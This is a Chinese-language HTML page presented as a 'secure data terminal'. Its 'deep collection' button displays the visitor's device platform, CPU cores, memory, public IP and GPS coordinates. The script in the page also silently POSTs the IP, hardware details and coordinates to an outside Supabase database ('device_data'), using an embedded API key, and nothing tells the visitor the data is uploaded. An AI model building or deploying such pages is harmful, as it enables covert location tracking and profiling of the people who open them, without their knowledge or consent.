<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>安全数据终端 - 朱子硕</title>
    <style>
        :root {
            --金属黑: #1a1a1a;
            --镌刻金: #9c8412;
            --金边: #d4af3780;
        }

        body {
            background: var(--金属黑);
            color: #d4af99;
            font-family: 'Microsoft YaHei', sans-serif;
            margin: 0;
            min-height: 100vh;
        }

        .status-bar {
            display: flex;
            justify-content: space-between;
            padding: 8px 15px;
            border-bottom: 1px solid var(--金边);
        }

        .data-panel {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
            padding: 15px;
        }

        .data-card {
            border: 1px solid var(--金边);
            padding: 15px;
            background: rgba(26,26,26,0.9);
        }

        .data-card h3 {
            color: var(--镌刻金);
            margin: 0 0 10px 0;
        }

        pre {
            white-space: pre-wrap;
            margin: 0;
        }

        .scan-btn {
            position: fixed;
            bottom: 20px;
            left: 15px;
            right: 15px;
            background: var(--镌刻金);
            color: #2a2a2a;
            border: none;
            padding: 16px;
            font-size: 1.1em;
        }
    </style>
</head>
<body>
    <div class="status-bar">
        <span>19:46</span>
        <div>
            <span style="margin-right:10px">12</span>
            <span>Wi-Fi</span>
            <span>82%</span>
        </div>
    </div>

    <div class="data-panel">
        <div class="data-card">
            <h3>时间戳</h3>
            <pre>2025/4/28</pre>
        </div>
        <div class="data-card">
            <h3>硬件概要</h3>
            <pre id="hardware">操作系统：加载中...
处理器核：加载中...
内存容量：加载中...</pre>
        </div>
        <div class="data-card">
            <h3>网络特征</h3>
            <pre id="network">IP地址：扫描中...</pre>
        </div>
        <div class="data-card">
            <h3>地理坐标</h3>
            <pre id="geo">纬度：----
经度：----</pre>
        </div>
    </div>

    <button class="scan-btn" onclick="startScan()">启动深度采集</button>

    <script>
        // IP获取核心代码（双保险方案）
        const getIP = async () => {
            try {
                // 方案1：通过Cloudflare
                const res1 = await fetch('https://www.cloudflare.com/cdn-cgi/trace');
                const text = await res1.text();
                const ipMatch = text.match(/ip=(.+)/);
                if(ipMatch) return ipMatch[1];

                // 方案2：备用API
                const res2 = await fetch('https://api.ipify.org?format=json');
                const data = await res2.json();
                return data.ip;
            } catch {
                return '受保护';
            }
        };

        // 数据回传核心代码
        const submitData = async (data) => {
            await fetch('https://yfuljidnzljfklkmuupb.supabase.co/rest/v1/device_data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                    'apikey': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlmdWxqaWRuemxqZmtsa211dXBiIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDU4MDM5MzEsImV4cCI6MjA2MTM3OTkzMX0.UHoW7xKPOEENYe1PueTrNpeWIumPusgj8FEkxoaQJpo'
                },
                body: JSON.stringify({
                    timestamp: new Date().toISOString(),
                    hardware: {
                        os: navigator.platform,
                        cores: navigator.hardwareConcurrency,
                        ram: navigator.deviceMemory || 'N/A'
                    },
                    ip: data.ip,
                    geo: data.geo
                })
            });
        };

        // 主逻辑
        const startScan = async () => {
            const hardwareInfo = {
                操作系统: navigator.platform,
                处理器核: navigator.hardwareConcurrency,
                内存容量: `${navigator.deviceMemory || '未知'}GB`
            };
            document.getElementById('hardware').textContent = 
                `操作系统：${hardwareInfo.操作系统}\n处理器核：${hardwareInfo.处理器核}\n内存容量：${hardwareInfo.内存容量}`;

            const ip = await getIP();
            document.getElementById('network').textContent = `IP地址：${ip}`;

            const geo = await new Promise(resolve => {
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({
                        纬度: pos.coords.latitude.toFixed(4),
                        经度: pos.coords.longitude.toFixed(4)
                    }),
                    () => resolve(null)
                );
            });

            if(geo) {
                document.getElementById('geo').textContent = 
                    `纬度：${geo.纬度}\n经度：${geo.经度}`;
                await submitData({ ip, geo });
            }
        };
    </script>
</body>
</html>
